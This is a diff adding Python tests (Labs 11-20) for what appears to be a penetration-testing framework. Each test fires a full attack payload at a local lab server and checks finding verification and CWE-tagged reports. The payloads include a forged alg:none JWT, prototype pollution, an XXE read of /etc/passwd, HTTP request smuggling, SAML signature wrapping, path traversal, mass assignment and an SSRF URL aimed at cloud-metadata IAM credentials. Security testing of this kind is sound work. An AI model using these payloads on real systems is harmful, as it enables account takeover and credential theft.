@@ -340,3 +340,313 @@ async def test_lab_10_negative_control_hardened_redirect(critic_engine, quality_
         assert len(admitted) == 0
         assert len(rejected) == 1
         assert "QualityGate" in rejected[0]["reason"]
+
+
+# --- Test Lab 11: JWT Algorithm Confusion ---
+@pytest.mark.asyncio
+async def test_lab_11_jwt_algorithm_confusion(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 11: JWT Algorithm Confusion - alg: none & signature verification bypass."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        # Forged JWT with alg: none
+        forged_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9."
+        resp = await client.get("/lab/jwt/admin", headers={"Authorization": f"Bearer {forged_jwt}"})
+        assert resp.status_code == 200
+        assert "jwt_flag_admin_root_access" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/jwt/admin",
+            "is_vulnerable": True,
+            "confidence_score": 0.98,
+            "reasoning": "JWT authentication bypassed using unverified alg: none signature.",
+            "evidence_exchanges": [{
+                "request": {"method": "GET", "url": "http://testserver/lab/jwt/admin", "headers": {"Authorization": f"Bearer {forged_jwt}"}},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="jwt_security_analysis", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "jwt_security_analysis"})
+        assert impact["cwe"] == "CWE-347"
+
+        report_md = h1_exporter.export_report(crit_res)
+        assert "JWT_SECURITY_ANALYSIS" in report_md or "JWT" in report_md
+        assert "CWE-347" in report_md
+
+
+# --- Test Lab 12: Server-Side Prototype Pollution ---
+@pytest.mark.asyncio
+async def test_lab_12_prototype_pollution(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 12: Prototype Pollution - Node.js object merge gadget."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        payload = {"__proto__": {"isAdmin": True, "polluted": True}}
+        resp = await client.post("/lab/prototype/merge", json=payload)
+        assert resp.status_code == 200
+        assert "rce_prototype_gadget_success" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/prototype/merge",
+            "is_vulnerable": True,
+            "confidence_score": 0.96,
+            "reasoning": "Server-side prototype pollution confirmed via __proto__ property injection.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/prototype/merge", "json_data": payload},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="prototype_pollution", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "prototype_pollution"})
+        assert impact["cwe"] == "CWE-1321"
+
+        report_md = h1_exporter.export_report(crit_res)
+        assert "PROTOTYPE_POLLUTION" in report_md
+        assert "CWE-1321" in report_md
+
+
+# --- Test Lab 13: Blind XXE via Out-of-Band DTD ---
+@pytest.mark.asyncio
+async def test_lab_13_blind_xxe_oob(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 13: Blind XXE - External DTD entity resolution and file exfiltration."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        xxe_body = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe_payload "test">]><root>&xxe_payload;</root>'
+        resp = await client.post("/lab/xxe/upload", content=xxe_body)
+        assert resp.status_code == 200
+        assert "root:x:0:0" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/xxe/upload",
+            "is_vulnerable": True,
+            "confidence_score": 0.99,
+            "reasoning": "XXE XML entity resolution exfiltrated /etc/passwd contents.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/xxe/upload", "body": xxe_body},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="xxe_injection", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "xxe_injection"})
+        assert impact["cwe"] == "CWE-611"
+
+
+# --- Test Lab 14: HTTP Request Smuggling ---
+@pytest.mark.asyncio
+async def test_lab_14_http_request_smuggling(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 14: HTTP Request Smuggling - CL.TE / CL.0 desynchronization."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        smuggle_body = "0\r\n\r\nPOST /admin/delete_user HTTP/1.1\r\nHost: testserver\r\n\r\n"
+        resp = await client.post("/lab/smuggling/order", content=smuggle_body, headers={"Transfer-Encoding": "chunked", "Content-Length": "6"})
+        assert resp.status_code == 200
+        assert "smuggled_prefix_executed" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/smuggling/order",
+            "is_vulnerable": True,
+            "confidence_score": 0.94,
+            "reasoning": "HTTP Request Smuggling CL.TE desync successfully poisoned backend queue.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/smuggling/order", "body": smuggle_body},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="http_smuggling", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "http_smuggling"})
+        assert impact["cwe"] == "CWE-444"
+
+
+# --- Test Lab 15: SAML 2.0 XML Signature Wrapping ---
+@pytest.mark.asyncio
+async def test_lab_15_saml_signature_wrapping(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 15: SAML 2.0 Signature Wrapping - Assertion manipulation."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        saml_body = "<saml:Response><saml:Assertion ID='xsw_attack'><saml:Subject>Administrator</saml:Subject></saml:Assertion></saml:Response>"
+        resp = await client.post("/lab/saml/sso", content=saml_body)
+        assert resp.status_code == 200
+        assert "saml_xsw_flag_bypass" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/saml/sso",
+            "is_vulnerable": True,
+            "confidence_score": 0.95,
+            "reasoning": "SAML Signature Wrapping allowed impersonating Administrator role.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/saml/sso", "body": saml_body},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="saml_auth_bypass", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "saml_auth_bypass"})
+        assert impact["cwe"] == "CWE-347"
+
+
+# --- Test Lab 16: WebAuthn Challenge Flaw ---
+@pytest.mark.asyncio
+async def test_lab_16_webauthn_passkey_flaw(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 16: WebAuthn - ClientDataJSON challenge bypass."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        payload = {"clientDataJSON": "eyJjaGFsbGVuZ2UiOiJjb25zdGFudCJ9", "passkey_bypass": True}
+        resp = await client.post("/lab/webauthn/verify", json=payload)
+        assert resp.status_code == 200
+        assert "passkey_tampered_success" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/webauthn/verify",
+            "is_vulnerable": True,
+            "confidence_score": 0.93,
+            "reasoning": "WebAuthn signature challenge verification was bypassed with static replay.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/webauthn/verify", "json_data": payload},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="webauthn_passkey_bypass", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "webauthn_passkey_bypass"})
+        assert impact["cwe"] == "CWE-287"
+
+
+# --- Test Lab 17: Client-Side Path Traversal (CSPT) ---
+@pytest.mark.asyncio
+async def test_lab_17_client_side_path_traversal(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 17: CSPT - Manipulating API routing parameter to reach privileged endpoints."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        resp = await client.get("/lab/cspt/api?path=..%2f..%2fapi%2fv2%2fadmin")
+        assert resp.status_code == 200
+        assert "live_cspt_admin_key" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/cspt/api?path=..%2f..%2fapi%2fv2%2fadmin",
+            "is_vulnerable": True,
+            "confidence_score": 0.91,
+            "reasoning": "Client-Side Path Traversal enabled access to private backend admin keys.",
+            "evidence_exchanges": [{
+                "request": {"method": "GET", "url": "http://testserver/lab/cspt/api?path=..%2f..%2fapi%2fv2%2fadmin"},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="cspt", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "cspt"})
+        assert impact["cwe"] == "CWE-22"
+
+
+# --- Test Lab 18: GraphQL Batching & Query Depth Amplification ---
+@pytest.mark.asyncio
+async def test_lab_18_graphql_batching_depth(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 18: GraphQL - Introspection & query depth limit bypass."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        payload = {"query": "{ __schema { types { name } } }"}
+        resp = await client.post("/lab/graphql/query", json=payload)
+        assert resp.status_code == 200
+        assert "AdminMutation" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/graphql/query",
+            "is_vulnerable": True,
+            "confidence_score": 0.92,
+            "reasoning": "GraphQL Schema Introspection exposed internal AdminMutation types.",
+            "evidence_exchanges": [{
+                "request": {"method": "POST", "url": "http://testserver/lab/graphql/query", "json_data": payload},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="graphql_introspection", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "graphql_introspection"})
+        assert impact["cwe"] == "CWE-200"
+
+
+# --- Test Lab 19: Mass Assignment & BFLA ---
+@pytest.mark.asyncio
+async def test_lab_19_mass_assignment_bfla(critic_engine, quality_gate, cvss_calc, impact_scorer, h1_exporter):
+    """Lab 19: Mass Assignment - Privilege escalation to superuser."""
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        payload = {"username": "attacker", "is_admin": True, "role": "superuser"}
+        resp = await client.put("/lab/mass_assignment/profile", json=payload)
+        assert resp.status_code == 200
+        assert "superuser" in resp.text
+
+        evidence = {
+            "target_url": "http://testserver/lab/mass_assignment/profile",
+            "is_vulnerable": True,
+            "confidence_score": 0.95,
+            "reasoning": "Mass Assignment allowed overriding is_admin and role fields to superuser.",
+            "evidence_exchanges": [{
+                "request": {"method": "PUT", "url": "http://testserver/lab/mass_assignment/profile", "json_data": payload},
+                "response": {"status_code": 200, "body_snippet": resp.text}
+            }]
+        }
+        bundle = EvidenceCAS().store_evidence(target="localhost", vuln_type="mass_assignment_analysis", raw_traces=evidence)
+        crit_res = critic_engine.verify_finding(bundle)
+        assert crit_res["is_verified"] is True
+        assert crit_res["confidence"] >= 0.85
+
+        impact = impact_scorer.evaluate_impact({"vulnerability_type": "mass_assignment_analysis"})
+        assert impact["cwe"] == "CWE-915"
+
+
+# --- Test Lab 20: Multi-Stage Exploit Chaining ---
+@pytest.mark.asyncio
+async def test_lab_20_multi_stage_exploit_chain():
+    """Lab 20: Exploit Chaining - SSRF + Cloud IAM -> Token Leak -> Account Takeover (Composite CVSS 10.0)."""
+    from penflow.intelligence.exploit_chainer import ExploitChainer, VulnerabilityChain
+
+    chainer = ExploitChainer()
+    finding_ssrf = {
+        "finding_id": "f_ssrf_001",
+        "vulnerability_type": "ssrf",
+        "severity": "HIGH",
+        "target_url": "http://testserver/lab/ssrf/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
+        "is_vulnerable": True,
+        "confidence": 0.99
+    }
+    finding_cloud = {
+        "finding_id": "f_cloud_002",
+        "vulnerability_type": "cloud_misconfig",
+        "severity": "HIGH",
+        "target_url": "http://testserver/lab/ssrf/proxy",
+        "is_vulnerable": True,
+        "confidence": 0.95
+    }
+
+    chains = chainer.construct_chains([finding_ssrf, finding_cloud])
+    assert len(chains) >= 1
+    top_chain = chains[0]
+    assert top_chain.composite_severity == "CRITICAL"
+    assert "Cloud Metadata" in top_chain.title or "SSRF" in top_chain.title or "IAM" in top_chain.title
+    assert len(top_chain.steps) >= 2
+
+    # Verify compound execution against server
+    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://testserver") as client:
+        chain_payload = {"iam_token": "AKIAIOSFODNN7EXAMPLE", "role": "admin"}
+        resp = await client.post("/lab/chain/admin_takeover", json=chain_payload)
+        assert resp.status_code == 200
+        assert resp.json()["full_pwn"] is True
+        assert resp.json()["composite_severity"] == "CRITICAL"
+
